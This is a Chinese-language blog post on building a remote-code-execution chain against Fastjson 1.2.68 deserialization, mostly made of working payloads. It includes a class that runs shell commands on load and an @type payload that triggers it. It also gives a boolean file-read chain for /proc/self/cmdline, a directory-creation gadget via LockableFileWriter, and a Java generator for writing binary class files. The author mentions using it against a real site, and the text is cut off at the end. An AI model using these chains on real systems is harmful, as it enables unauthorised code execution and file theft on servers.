{"title":"Fastjson 1.2.80调试小记","uid":"fb1b22e9cffe64caefaaf1ad19f54d41","slug":"fastjson 1.2.80调试小记","date":"2022-09-27T10:38:45.000Z","updated":"2023-04-11T11:39:08.097Z","comments":true,"path":"api/articles/fastjson 1.2.80调试小记.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/image.5hsjeydq0cg0.png","content":"<h1 id=\"fastjson-1-2-68-反序列化rce探索\"><a href=\"#fastjson-1-2-68-反序列化rce探索\" class=\"headerlink\" title=\"fastjson 1.2.68 反序列化rce探索\"></a>fastjson 1.2.68 反序列化rce探索</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>  fastjson 1.2.68 目前公开的利用链中比较好用的是voidfyoo师傅的Commons IO 写文件链子，但是在spring环境下，仅仅通过写文件rce较为困难，本文更多的是结合多位师傅的文章理出一条通过写文件稳定rce方法</p>\n<h2 id=\"JDK8任意文件写场景下的Fastjson-RCE\"><a href=\"#JDK8任意文件写场景下的Fastjson-RCE\" class=\"headerlink\" title=\"JDK8任意文件写场景下的Fastjson RCE\"></a>JDK8任意文件写场景下的Fastjson RCE</h2><p>  通过覆盖charsets.jar缺点太多，一是文件大，二是java版本不适配。另外笔者觉得还有一个致命因素，一般来说项目中只要使用了Charset.forName 就会加载charsets.jar，这样来讲正常的业务代码中几乎都已经加载过charsets.jar，即使后来再覆盖charsets.jar也不会重新加载。仅为笔者个人（java初学者）想法（或许是在哪里看到过别的师傅的文章，有点印象），如有错误欢迎师傅指点。</p>\n<p>  threedr3am师傅给出了任意文件写的情况下，如何更稳定地rce。简单来讲如果写一个恶意的class到jre/classes/目录下，class内容如下：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MyClass</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">AutoCloseable</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">MyClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> cmd<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"open -a Calculator\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> var1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">(</span>var1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  正在运行的项目会加载这个class文件，我们只需要使用如下poc即可rce。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"MyClass\",\"cmd\":\"open -a Calculator\"}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>  这里只做简述，具体原理到threedr3am师傅的博客中查看。</p>\n<p>  很可惜的是jre目录下默认并不会存在classes目录，另外voidfyoo师傅给出的Commons IO 写文件链子不能写二进制文件，具体原因是使用的输入输出流都是经过编码的，而二进制文件中部分字符编码/解码失败就会写入脏字符。<br>那么目前我们需要解决的问题有三点：</p>\n<ol>\n<li>获取jdk目录</li>\n<li>创建classes目录</li>\n<li>写入class文件</li>\n</ol>\n<h2 id=\"获取jdk目录\"><a href=\"#获取jdk目录\" class=\"headerlink\" title=\"获取jdk目录\"></a>获取jdk目录</h2><p>  在Blackhat的议题中分享了一条commons-io逐字节读文件的链子，但是局限性很大。经过浅蓝师傅的扩展，目前可以做到有抛出异常的布尔读和利用dnslog 无回显读 ,贴一下浅蓝师傅的有抛出异常的布尔读取文件的poc：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">{\n  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n    \"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n      \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n        \"url\": \"file:///tmp/test\"\n      },\n      \"charsetName\": \"UTF-8\",\n      \"bufferSize\": 1024\n    },\"boms\": [\n      {\n        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n        \"charsetName\": \"UTF-8\",\n        \"bytes\": [\n          98\n        ]\n      }\n    ]\n  },\n  \"address\" : {\"@type\": \"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\": {\"@type\": \"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"},\"start\": 0,\"end\": 0}\n}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  当字节码对比一致时就会走到下面charSequence处，因为类型不一致fastjson报错，业务抛出异常，<br>字节码对比不一致时返回为null，fastjson也就不会报错，业务回显正常。<br>我们可以直接读取启动命令 /proc/self/cmdline， 有的时候直接是用绝对路径来启动的，如果不是可以用netdoc协议列目录找到jdk路径</p>\n<h2 id=\"创建classes目录\"><a href=\"#创建classes目录\" class=\"headerlink\" title=\"创建classes目录\"></a>创建classes目录</h2><p>  笔者找到一条简单的通过Commons IO创建目录的链子，使用的类是<code>org.apache.commons.io.output.LockableFileWriter</code></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">LockableFileWriter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">File</span> file<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Charset</span> encoding<span class=\"token punctuation\">,</span> <span class=\"token keyword\">boolean</span> append<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> lockDir<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        file <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">getAbsoluteFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">getParentFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">FileUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">forceMkdir</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">getParentFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">isDirectory</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"File specified is a directory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lockDir <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                lockDir <span class=\"token operator\">=</span> <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">getProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.io.tmpdir\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token class-name\">File</span> lockDirFile <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>lockDir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">FileUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">forceMkdir</span><span class=\"token punctuation\">(</span>lockDirFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">testLockDir</span><span class=\"token punctuation\">(</span>lockDirFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lockFile <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>lockDirFile<span class=\"token punctuation\">,</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".lck\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">createLock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>out <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">initWriter</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">,</span> encoding<span class=\"token punctuation\">,</span> append<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n\n<span class=\"token class-name\">FileUtils</span>#forceMkdir\n\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">forceMkdir</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">File</span> directory<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>directory<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>directory<span class=\"token punctuation\">.</span><span class=\"token function\">mkdirs</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>directory<span class=\"token punctuation\">.</span><span class=\"token function\">isDirectory</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n          <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n        <span class=\"token punctuation\">}</span>\n\n    <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>poc</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">{\n \"@type\":\"java.lang.AutoCloseable\",\n \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n \"writer\":{\n \"@type\":\"org.apache.commons.io.output.LockableFileWriter\",\n \"file\":\"/etc/passwd\", //一个存在的文件\n \"encoding\":\"UTF-8\",\n \"append\": true,\n\"lockDir\":\"/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\" //要创建的目录\n },\n \"charset\":\"UTF-8\",\n \"bufferSize\": 8193,\n \"writeImmediately\": true\n }<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  file需要是一个存在的文件，才能走到下面的FileUtils.forceMkdir(lockDirFile) 创建目录<br>注：mac环境下可能有保护机制，jre下classes创建不了，实测ubuntu上是可以创建的。</p>\n<h2 id=\"写入class文件\"><a href=\"#写入class文件\" class=\"headerlink\" title=\"写入class文件\"></a>写入class文件</h2><p>  笔者能力有限，只依赖commons-io 未能找到一条写二进制文件的链子，在Blackhat的议题中分享了一条基于commons-io、commons-codec、aspectj写二进制文件的链，笔者近日打的fastjson刚好有commons-io、commons-codec，但是没有aspectj。于是在另一位师傅列出lib之后，在ant中找到了<code>org.apache.tools.ant.util.LazyFileOutputStream</code> 类，可以替代aspectj中的<code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">write_so</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> target_path<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bom_buffer_bytes <span class=\"token operator\">=</span> <span class=\"token function\">readFileInBytesToString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./target/classes/MyClass.class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> base64_so_content <span class=\"token operator\">=</span> <span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getEncoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">encodeToString</span><span class=\"token punctuation\">(</span>bom_buffer_bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> big_bom_buffer_bytes <span class=\"token operator\">=</span> <span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>base64_so_content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> payload <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"  \\\"@type\\\":\\\"java.lang.AutoCloseable\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"  \\\"@type\\\":\\\"org.apache.commons.io.input.BOMInputStream\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"  \\\"delegate\\\":{\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"    \\\"@type\\\":\\\"org.apache.commons.io.input.TeeInputStream\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"    \\\"input\\\":{\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      \\\"@type\\\": \\\"org.apache.commons.codec.binary.Base64InputStream\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      \\\"in\\\":{\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"        \\\"@type\\\":\\\"org.apache.commons.io.input.CharSequenceInputStream\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"        \\\"charset\\\":\\\"utf-8\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"        \\\"bufferSize\\\": 1024,\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"        \\\"cs\\\":{\\\"@type\\\":\\\"java.lang.String\\\"\\\"%1$s\\\"\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      },\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      \\\"doEncode\\\":false,\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      \\\"lineLength\\\":1024,\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      \\\"lineSeparator\\\":\\\"5ZWKCg==\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      \\\"decodingPolicy\\\":0\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"    },\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"    \\\"branch\\\":{\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token comment\">//\"      \\\"@type\\\":\\\"org.eclipse.core.internal.localstore.SafeFileOutputStream\\\",\\n\" +</span>\n                <span class=\"token comment\">//\"      \\\"targetPath\\\":\\\"%2$s\\\"\\n\" +</span>\n                <span class=\"token string\">\"      \\\"@type\\\":\\\"org.apache.tools.ant.util.LazyFileOutputStream\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      \\\"file\\\":\\\"%2$s\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      \\\"append\\\":false,\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"      \\\"alwaysCreate\\\":true\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"    },\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"    \\\"closeBranch\\\":false\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"  },\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"  \\\"include\\\":true,\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"  \\\"boms\\\":[{\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"                  \\\"@type\\\": \\\"org.apache.commons.io.ByteOrderMark\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"                  \\\"charsetName\\\": \\\"UTF-8\\\",\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"                  \\\"bytes\\\":\"</span> <span class=\"token operator\">+</span><span class=\"token string\">\"%3$s\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"                }],\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"  \\\"x\\\":{\\\"$ref\\\":\\\"$.bOM\\\"}\\n\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"}\"</span><span class=\"token punctuation\">,</span>base64_so_content<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/tmp/MyClass.class\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span>big_bom_buffer_bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">readFileInBytesToString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> filePath<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> readArraySizePerRead <span class=\"token operator\">=</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">File</span> file <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Byte</span><span class=\"token punctuation\">&gt;</span></span> bytes <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">DataInputStream</span> isr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DataInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileInputStream</span><span class=\"token punctuation\">(</span>\n                        file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> tempchars <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span>readArraySizePerRead<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">int</span> charsReadCount <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>charsReadCount <span class=\"token operator\">=</span> isr<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>tempchars<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> charsReadCount <span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                        bytes<span class=\"token punctuation\">.</span>add <span class=\"token punctuation\">(</span>tempchars<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n                isr<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// TODO Auto-generated catch block</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token function\">toPrimitives</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">.</span><span class=\"token function\">toArray</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Byte</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">toPrimitives</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> oBytes<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span>oBytes<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> oBytes<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            bytes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> oBytes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">return</span> bytes<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  笔者在vps用jar起的环境和本地手动创建classes目录之后都是可以成功的。</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221114/1111.1y29qdvr30zk.png\"></p>\n<p>  但是打的站没成功，别的师傅通过别的链打下来后，笔者上去看了下class文件没问题，也能直接运行，但是很奇怪用fastjson加载不了。</p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" 